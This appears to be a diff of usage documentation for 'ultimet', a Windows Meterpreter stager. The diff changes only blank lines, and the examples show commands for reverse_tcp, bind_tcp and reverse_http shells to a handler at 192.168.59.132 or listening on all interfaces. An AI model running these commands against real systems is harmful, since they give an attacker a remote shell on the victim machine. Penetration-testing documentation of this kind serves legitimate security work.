@@ -21,18 +21,23 @@ ultimet:
  _Working as payload:_
  Example#1: Connect back to a meterpreter/reverse_tcp handler, LPORT=4444, LHOST=192.168.59.132
  `ultimet.exe -t reverse_tcp -h 192.168.59.132 -p 4444`
+ 
  Example#2: Start listening "bind" on all interfaces waiting for a meterpreter/bind_tcp handler to connect, LPORT=8888
  `ultimet.exe -t bind_tcp -h 0.0.0.0 -p 8888`
+ 
  Example#3: Load stage from local file, connect back to a meterpreter/reverse_http handler, LPORT=8080, LHOST=192.168.59.132
  `ultimet.exe -f c:\wwwroot\uploads\metsrv.dll -t reverse_http -h 192.168.59.132 -p 8080`
 
 _Working as msfpayload:_
  Example#1: msfpayload windows/meterpreter/reverse_tcp LPORT=4444 LHOST=192.168.59.132
  `ultimet.exe -t reverse_tcp -h 192.168.59.132 -p 4444 --msfpayload`
+ 
  Example#2: Reset exe to default and remove all pre-set connection settings
  `ultimet.exe --reset`
+ 
  Example#3: Remove bundled stage to create a smaller file
  `ultimet.exe --remove-stage`
+ 
  
 ---------------
 1. Introduction
